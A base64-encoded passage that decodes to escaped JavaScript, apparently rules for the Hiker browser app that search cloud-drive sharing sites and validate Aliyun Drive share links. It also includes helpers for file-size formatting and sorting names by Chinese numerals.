c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogaXRlbS50aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogJ+WPkeW4g+aXtumXtO+8micgKyAkLmRhdGVGb3JtYXQobmV3IERhdGUoaXRlbS5jcmVhdGVkQXQpLCBcXFxcXFxcInl5eXktTU0tZGQgSEg6bW06c3NcXFxcXFxcIiksXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdXJsLFxcXFxuICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbG9uZ0NsaWNrOiBbe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIui/m+WFpeW4luWtkFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGpzOiBKU09OLnN0cmluZ2lmeShcXFxcXFxcImhpa2VyOi8vcGFnZS95c2Z4P3dlYlVybD1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudCh1cmwpKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfV1cXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH0sXFxcXG4gICAgICAgIGZpbmRBbGlVcmwoaW5wdXQpIHtcXFxcbiAgICAgICAgICAgIGxldCBodG1sID0gcGRmaChyZXF1ZXN0KGlucHV0KSwgXFxcXFxcXCJUZXh0XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IF9saW5rcyA9IGh0bWwubWF0Y2goL2h0dHBzOlxcXFxcXFxcL1xcXFxcXFxcLyh3d3dcXFxcXFxcXC5hbGl5dW5kcml2ZVxcXFxcXFxcLmNvbVxcXFxcXFxcL3N8YWx5d3BcXFxcXFxcXC5uZXQpXFxcXFxcXFwvXFxcXFxcXFx3Ki9nKSB8fCBbXTtcXFxcbiAgICAgICAgICAgIGxldCBzaGFyZVB3ZCA9IGh0bWwubWF0Y2goL+aPkOWPlueggVs677yaXVxcXFxcXFxccyo/KFxcXFxcXFxcd3s0fSkvKTtcXFxcbiAgICAgICAgICAgIHNoYXJlUHdkID0gQXJyYXkuaXNBcnJheShzaGFyZVB3ZCkgJiYgc2hhcmVQd2QubGVuZ3RoID4gMCA/IHNoYXJlUHdkWzFdIDogXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIGlmIChfbGlua3MubGVuZ3RoID4gMSAmJiBfbGlua3NbMV0ucmVwbGFjZShfbGlua3NbMF0sIFxcXFxcXFwiXFxcXFxcXCIpLnJlcGxhY2UoL1thLXpBLVowLTldKy9nLCBcXFxcXFxcIlxcXFxcXFwiKSA9PSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYWxpVXJsOiBfbGlua3NbMV0sXFxcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlUHdkOiBzaGFyZVB3ZFxcXFxuICAgICAgICAgICAgICAgIH07XFxcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKF9saW5rcy5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYWxpVXJsOiBfbGlua3NbMF0sXFxcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlUHdkOiBzaGFyZVB3ZFxcXFxuICAgICAgICAgICAgICAgIH07XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS95c2Z4P3dlYlVybD1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChpbnB1dCk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgbmFtZTogJ+S6keebmOWIhuS6q+ekvuWMuicsXFxcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXFxcbiAgICAgICAgICAgIGxldCBob21lID0gXFxcXFxcXCJodHRwczovL3l1bnBhbjEuY2NcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIGxldCBkID0gW107XFxcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoYnVpbGRVcmwoaG9tZSArIFxcXFxcXFwiL2FwaS9kaXNjdXNzaW9uc1xcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICAgICAgXFxcXFxcXCJpbmNsdWRlXFxcXFxcXCI6IFxcXFxcXFwidXNlcixsYXN0UG9zdGVkVXNlcixtb3N0UmVsZXZhbnRQb3N0LG1vc3RSZWxldmFudFBvc3QudXNlcix0YWdzLHRhZ3MucGFyZW50LGZpcnN0UG9zdFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwiZmlsdGVyW3FdXFxcXFxcXCI6IHMgLyogKyBcXFxcXFxcIiB0YWc6dmlkZW8sY29taWNcXFxcXFxcIiovICxcXFxcbiAgICAgICAgICAgICAgICAvL1xcXFxcXFwiZmlsdGVyW3RhZ11cXFxcXFxcIjogXFxcXFxcXCJ2aWRlbyxjb21pY1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwicGFnZVtvZmZzZXRdXFxcXFxcXCI6IDIwICogKHBhZ2UgLSAxKVxcXFxuICAgICAgICAgICAgfSksIHtcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiY29udGVudC10eXBlXFxcXFxcXCI6IFxcXFxcXFwiYXBwbGljYXRpb24vanNvblxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlJlZmVyZXJcXFxcXFxcIjogXFxcXFxcXCJodHRwczovL3BhbjY2Ni5uZXQvP3E9XFxcXFxcXCIgKyBzXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICBsZXQgbGlzdCA9IEpTT04ucGFyc2UoaHRtbCkuZGF0YTtcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGlzdC5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgIGxldCBpdGVtID0gbGlzdFtpXS5hdHRyaWJ1dGVzO1xcXFxuICAgICAgICAgICAgICAgIGxldCB1cmwgPSBob21lICsgXFxcXFxcXCIvZC9cXFxcXFxcIiArIGl0ZW0uc2x1ZztcXFxcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogaXRlbS50aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogJ+WPkeW4g+aXtumXtO+8micgKyAkLmRhdGVGb3JtYXQobmV3IERhdGUoaXRlbS5jcmVhdGVkQXQpLCBcXFxcXFxcInl5eXktTU0tZGQgSEg6bW06c3NcXFxcXFxcIiksXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdXJsLFxcXFxuICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbG9uZ0NsaWNrOiBbe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIui/m+WFpeW4luWtkFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGpzOiBKU09OLnN0cmluZ2lmeShcXFxcXFxcImhpa2VyOi8vcGFnZS95c2Z4P3dlYlVybD1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudCh1cmwpKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfV1cXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH0sXFxcXG4gICAgICAgIGZpbmRBbGlVcmwoaW5wdXQpIHtcXFxcbiAgICAgICAgICAgIGxldCBodG1sID0gcGRmaChyZXF1ZXN0KGlucHV0KSwgXFxcXFxcXCJUZXh0XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IF9saW5rcyA9IGh0bWwubWF0Y2goL2h0dHBzOlxcXFxcXFxcL1xcXFxcXFxcLyh3d3dcXFxcXFxcXC5hbGl5dW5kcml2ZVxcXFxcXFxcLmNvbVxcXFxcXFxcL3N8YWx5d3BcXFxcXFxcXC5uZXQpXFxcXFxcXFwvXFxcXFxcXFx3Ki9nKSB8fCBbXTtcXFxcbiAgICAgICAgICAgIGxldCBzaGFyZVB3ZCA9IGh0bWwubWF0Y2goL+aPkOWPlueggVs677yaXVxcXFxcXFxccyo/KFxcXFxcXFxcd3s0fSkvKTtcXFxcbiAgICAgICAgICAgIHNoYXJlUHdkID0gQXJyYXkuaXNBcnJheShzaGFyZVB3ZCkgJiYgc2hhcmVQd2QubGVuZ3RoID4gMCA/IHNoYXJlUHdkWzFdIDogXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIGlmIChfbGlua3MubGVuZ3RoID4gMSAmJiBfbGlua3NbMV0ucmVwbGFjZShfbGlua3NbMF0sIFxcXFxcXFwiXFxcXFxcXCIpLnJlcGxhY2UoL1thLXpBLVowLTldKy9nLCBcXFxcXFxcIlxcXFxcXFwiKSA9PSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYWxpVXJsOiBfbGlua3NbMV0sXFxcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlUHdkOiBzaGFyZVB3ZFxcXFxuICAgICAgICAgICAgICAgIH07XFxcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKF9saW5rcy5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYWxpVXJsOiBfbGlua3NbMF0sXFxcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlUHdkOiBzaGFyZVB3ZFxcXFxuICAgICAgICAgICAgICAgIH07XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS95c2Z4P3dlYlVybD1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChpbnB1dCk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgLyosXFxcXG4gICAgICAgIHtcXFxcbiAgICAgICAgICAgIG5hbWU6IFxcXFxcXFwi5aWH5aaZ5pCc57SiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBwYWdlOiB0cnVlLFxcXFxuICAgICAgICAgICAgZmluZChzLCBwYWdlKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHVybDtcXFxcbiAgICAgICAgICAgICAgICBpZiAocGFnZSA9PT0gMSkge1xcXFxuICAgICAgICAgICAgICAgICAgICB1cmwgPSBidWlsZFVybChcXFxcXFxcImh0dHBzOi8vd3d3Lm1hZ2ljYWxzZWFyY2gudG9wL2FwaS9wc2hvdS9nZXREYXRhXFxcXFxcXCIsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHdvcmQ6IHMsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiBcXFxcXFxcIumYv+mHjOe9keebmFxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHVybCA9IGJ1aWxkVXJsKFxcXFxcXFwiaHR0cHM6Ly93d3cubWFnaWNhbHNlYXJjaC50b3AvYXBpL3BzaG91L2dldE5leHRQYWdlXFxcXFxcXCIsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJodHRwczovL2FwaS51cHl1bnNvMi5jb20vc2VhcmNoP3NfdHlwZT0yQHBhZ2U9XFxcXFxcXCIgKyBwYWdlICsgXFxcXFxcXCJAa2V5d29yZD1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChzKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHdlYnNpdGU6IFxcXFxcXFwi6Zi/6YeM572R55uYXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGxldCByZXN1bHQgPSByZXF1ZXN0KHVybCwge1xcXFxuICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBSZWZlcmVyOiBidWlsZFVybChcXFxcXFxcImh0dHBzOi8vd3d3Lm1hZ2ljYWxzZWFyY2gudG9wL3NlYXJjaFxcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgd29yZDogcyxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcGFnZTogMFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIHJlc3VsdCA9IEpTT04ucGFyc2UoSlNPTi5wYXJzZShyZXN1bHQpKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgbGlzdCA9IHJlc3VsdC5yZXN1bHQuaXRlbXM7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGQgPSBbXTtcXFxcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBpdCBvZiBsaXN0KSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmIChpdC5pZCA9PSAtMSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBpdC50aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlc2M6IFxcXFxcXFwi5pel5pyf77yaXFxcXFxcXCIgKyBpdC5pbnNlcnRfdGltZSArIFxcXFxcXFwiXFxcXFxcXFxu6Lev5b6E77yaXFxcXFxcXCIgKyBpdC5wYXRoLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBpdC5wYWdlX3VybFxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0qL1xcXFxuXTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLlt6XlhbdcXFwiLFxcXCJwYXRoXFxcIjpcXFwiYWxpVXRpbFxcXCIsXFxcInJ1bGVcXFwiOlxcXCIkLmV4cG9ydHMgPSB7XFxcXG4gICAgY2hlY2thbGkocmVhbHVybCkge1xcXFxuICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgaWYgKHJlYWx1cmwuaW5jbHVkZXMoXFxcXFxcXCJjb20vcy9cXFxcXFxcIikgJiYgcmVhbHVybCAhPSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHNoYXJlSWQgPSByZWFsdXJsLnNwbGl0KFxcXFxcXFwiP1xcXFxcXFwiKVswXS5zcGxpdChcXFxcXFxcIi9cXFxcXFxcIilbNF07XFxcXG4gICAgICAgICAgICAgICAgbGV0IHNoYXJlID0gZmV0Y2goXFxcXFxcXCJodHRwczovL2FwaS5hbGl5dW5kcml2ZS5jb20vYWRyaXZlL3YzL3NoYXJlX2xpbmsvZ2V0X3NoYXJlX2J5X2Fub255bW91c1xcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlVzZXItQWdlbnRcXFxcXFxcIjogUENfVUEsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlJlZmVyZXJcXFxcXFxcIjogXFxcXFxcXCJodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgICAgICAgICAgYm9keToge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJzaGFyZV9pZFxcXFxcXFwiOiBzaGFyZUlkXFxcXG4gICAgICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgaWYgKHNoYXJlLmluY2x1ZGVzKFxcXFxcXFwic2hhcmVfbGluayBpc1xcXFxcXFwiKSB8fCBzaGFyZS5pbmNsdWRlcyhcXFxcXFxcInNoYXJlX2xpbmsgY2Fubm90XFxcXFxcXCIpKSByZXR1cm4gZmFsc2U7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHt9XFxcXG4gICAgICAgIHJldHVybiB0cnVlO1xcXFxuICAgIH0sXFxcXG4gICAgYnl0ZXNUb1NpemUoc2l6ZSkge1xcXFxuICAgICAgICBpZiAoIXNpemUpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiAnMCc7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgY29uc3QgdW5pdHMgPSBbJ0InLCAnS0InLCAnTUInLCAnR0InLCAnVEInLCAnUEInLCAnRUInLCAnWkInLCAnWUInXTtcXFxcbiAgICAgICAgbGV0IGkgPSAwO1xcXFxuICAgICAgICB3aGlsZSAoc2l6ZSA+PSAxMDI0KSB7XFxcXG4gICAgICAgICAgICBzaXplIC89IDEwMjQ7XFxcXG4gICAgICAgICAgICBpKys7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgc2l6ZSA9IGkgPyBOdW1iZXIoc2l6ZS50b0ZpeGVkKDIpKSA6IHNpemU7XFxcXG4gICAgICAgIHJldHVybiBgJHtzaXplfSAke3VuaXRzW2ldfWA7XFxcXG4gICAgfSxcXFxcbiAgICBnZXRDcnlwdG9KUygpIHtcXFxcbiAgICAgICAgaWYgKHR5cGVvZiBDcnlwdG9KUyA9PT0gXFxcXFxcXCJ1bmRlZmluZWRcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgZXZhbChnZXRDcnlwdG9KUygpKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBDcnlwdG9KUztcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gQ3J5cHRvSlM7XFxcXG4gICAgfSxcXFxcbiAgICBnZXROYW1lc1NvcnQoKSB7XFxcXG4gICAgICAgIGxldCBjaG5OdW1DaGFyID0ge1xcXFxuICAgICAgICAgICAg6Zu2OiAwLFxcXFxuICAgICAgICAgICAg5LiAOiAxLFxcXFxuICAgICAgICAgICAg5LqMOiAyLFxcXFxuICAgICAgICAgICAg5LiJOiAzLFxcXFxuICAgICAgICAgICAg5ZubOiA0LFxcXFxuICAgICAgICAgICAg5LqUOiA1LFxcXFxuICAgICAgICAgICAg5YWtOiA2LFxcXFxuICAgICAgICAgICAg5LiDOiA3LFxcXFxuICAgICAgICAgICAg5YWrOiA4LFxcXFxuICAgICAgICAgICAg5LmdOiA5XFxcXG4gICAgICAgIH07XFxcXG5cXFxcbiAgICAgICAgbGV0IGNobk5hbWVWYWx1ZSA9IHtcXFxcbiAgICAgICAgICAgIOWNgToge1xcXFxuICAgICAgICAgICAgICAgIHZhbHVlOiAxMCxcXFxcbiAgICAgICAgICAgICAgICBzZWNVbml0OiBmYWxzZVxcXFxuICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgIOeZvjoge1xcXFxuICAgICAgICAgICAgICAgIHZhbHVlOiAxMDAsXFxcXG4gICAgICAgICAgICAgICAgc2VjVW5pdDogZmFsc2VcXFxcbiAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICDljYM6IHtcXFxcbiAgICAgICAgICAgICAgICB2YWx1ZTogMTAwMCxcXFxcbiAgICAgICAgICAgICAgICBzZWNVbml0OiBmYWxzZVxcXFxuICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgIOS4hzoge1xcXFxuICAgICAgICAgICAgICAgIHZhbHVlOiAxMDAwMCxcXFxcbiAgICAgICAgICAgICAgICBzZWNVbml0OiB0cnVlXFxcXG4gICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAg5Lq/OiB7XFxcXG4gICAgICAgICAgICAgICAgdmFsdWU6IDEwMDAwMDAwMCxcXFxcbiAgICAgICAgICAgICAgICBzZWNVbml0OiB0cnVlXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcblxcXFxuICAgICAgICBmdW5jdGlvbiBDaGluZXNlVG9OdW1iZXIoY2huU3RyKSB7XFxcXG4gICAgICAgICAgICBsZXQgcnRuID0gMDtcXFxcbiAgICAgICAgICAgIGxldCBzZWN0aW9uID0gMDtcXFxcbiAgICAgICAgICAgIGxldCBudW1iZXIgPSAwO1xcXFxuICAgICAgICAgICAgbGV0IHNlY1VuaXQgPSBmYWxzZTtcXFxcbiAgICAgICAgICAgIGxldCBzdHIgPSBjaG5TdHIuc3BsaXQoJycpO1xcXFxuXFxcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHN0ci5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgIGxldCBudW0gPSBjaG5OdW1DaGFyW3N0cltpXV07XFxcXG4gICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBudW0gIT09ICd1bmRlZmluZWQnKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIG51bWJlciA9IG51bTtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKGkgPT09IHN0ci5sZW5ndGggLSAxKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWN0aW9uICs9IG51bWJlcjtcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCB1bml0ID0gY2huTmFtZVZhbHVlW3N0cltpXV0udmFsdWU7XFxcXG4gICAgICAgICAgICAgICAgICAgIHNlY1VuaXQgPSBjaG5OYW1lVmFsdWVbc3RyW2ldXS5zZWNVbml0O1xcXFxuICAgICAgICAgICAgICAgICAgICBpZiAoc2VjVW5pdCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgc2VjdGlvbiA9IChzZWN0aW9uICsgbnVtYmVyKSAqIHVuaXQ7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBydG4gKz0gc2VjdGlvbjtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlY3Rpb24gPSAwO1xcXFxuICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgc2VjdGlvbiArPSAobnVtYmVyICogdW5pdCk7XFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgbnVtYmVyID0gMDtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICByZXR1cm4gcnRuICsgc2VjdGlvbjtcXFxcbiAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgIGZ1bmN0aW9uIG5hbWVDb21wYXJlKGEsIGIpIHtcXFxcbiAgICAgICAgICAgIGlmIChhID09IG51bGwgfHwgYiA9PSBudWxsKVxcXFxuICAgICAgICAgICAgICAgIHJldHVybiBhID09IG51bGwgPyBiID09IG51bGwgPyAwIDogLTEgOiAxO1xcXFxuXFxcXG4gICAgICAgICAgICBhID0gYS5yZXBsYWNlKC8oW+mbtuS4gOS6jOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+S6v10pL2csIGZ1bmN0aW9uKG1hdGNoLCBwMSwgcDIsIHAzLCBvZmZzZXQsIHN0cmluZykge1xcXFxuICAgICAgICAgICAgICAgIC8vIHAxIGlzIG5vbmRpZ2l0cywgcDIgZGlnaXRzLCBhbmQgcDMgbm9uLWFscGhhbnVtZXJpY3NcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gQ2hpbmVzZVRvTnVtYmVyKHAxKTtcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICBiID0gYi5yZXBsYWNlKC8oW+mbtuS4gOS6jOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+S6v10pL2csIGZ1bmN0aW9uKG1hdGNoLCBwMSwgcDIsIHAzLCBvZmZzZXQsIHN0cmluZykge1xcXFxuICAgICAgICAgICAgICAgIC8vIHAxIGlzIG5vbmRpZ2l0cywgcDIgZGlnaXRzLCBhbmQgcDMgbm9uLWFscGhhbnVtZXJpY3NcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gQ2hpbmVzZVRvTnVtYmVyKHAxKTtcXFxcbiAgICAgICAgICAgIH0pXFxcXG5cXFxcbiAgICAgICAgICAgIGxldCBOVU1CRVJTID0gamF2YS51dGlsLnJlZ2V4LlBhdHRlcm4uY29tcGlsZShcXFxcXFxcIig/PD1cXFxcXFxcXFxcXFxcXFxcRCkoPz1cXFxcXFxcXFxcXFxcXFxcZCl8KD88PVxcXFxcXFxcXFxcXFxcXFxkKSg/PVxcXFxcXFxcXFxcXFxcXFxEKVxcXFxcXFwiKVxcXFxuICAgICAgICAgICAgbGV0IHNwbGl0MSA9IE5VTUJFUlMuc3BsaXQobmV3IGphdmEubGFuZy5TdHJpbmcoYSkpO1xcXFxuICAgICAgICAgICAgbGV0IHNwbGl0MiA9IE5VTUJFUlMuc3BsaXQobmV3IGphdmEubGFuZy5TdHJpbmcoYikpO1xcXFxuXFxcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IE1hdGgubWluKHNwbGl0MS5sZW5ndGgsIHNwbGl0Mi5sZW5ndGgpOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgYzEgPSBzcGxpdDFbaV0uY2hhckNvZGVBdCgwKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgYzIgPSBzcGxpdDJbaV0uY2hhckNvZGVBdCgwKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgY21wID0gMDtcXFxcbiAgICAgICAgICAgICAgICBsZXQgemVyb0NoYXJDb2RlID0gJzAnLmNoYXJDb2RlQXQoMCk7XFxcXG4gICAgICAgICAgICAgICAgbGV0IG5pbmVDaGFyQ29kZSA9ICc5Jy5jaGFyQ29kZUF0KDApO1xcXFxuXFxcXG4gICAgICAgICAgICAgICAgaWYgKGMxID49IHplcm9DaGFyQ29kZSAmJiBjMSA8PSBuaW5lQ2hhckNvZGUgJiYgYzIgPj0gemVyb0NoYXJDb2RlICYmIGMyIDw9IG5pbmVDaGFyQ29kZSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBjbXAgPSBuZXcgamF2YS5tYXRoLkJpZ0ludGVnZXIoc3BsaXQxW2ldKS5jb21wYXJlVG8obmV3IGphdmEubWF0aC5CaWdJbnRlZ2VyKHNwbGl0MltpXSkpO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcblxcXFxuICAgICAgICAgICAgICAgIGlmIChjbXAgPT09IDApIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHJlZ2V4ID0gL1thLXpBLVowLTldL1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgczEgPSBTdHJpbmcoc3BsaXQxW2ldKVxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgczIgPSBTdHJpbmcoc3BsaXQyW2ldKVxcXFxuICAgICAgICAgICAgICAgICAgICBpZiAocmVnZXgudGVzdChzMSkgfHwgcmVnZXgudGVzdChzMikpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNtcCA9IG5ldyBqYXZhLmxhbmcuU3RyaW5nKHNwbGl0MVtpXSkuY29tcGFyZVRvKG5ldyBqYXZhLmxhbmcuU3RyaW5nKHNwbGl0MltpXSkpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgLy8gY21wID0gczEubG9jYWxlQ29tcGFyZShzMiwgJ2VuJylcXFxcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNtcCA9IHMxLmxvY2FsZUNvbXBhcmUoczIsICd6aCcpXFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxc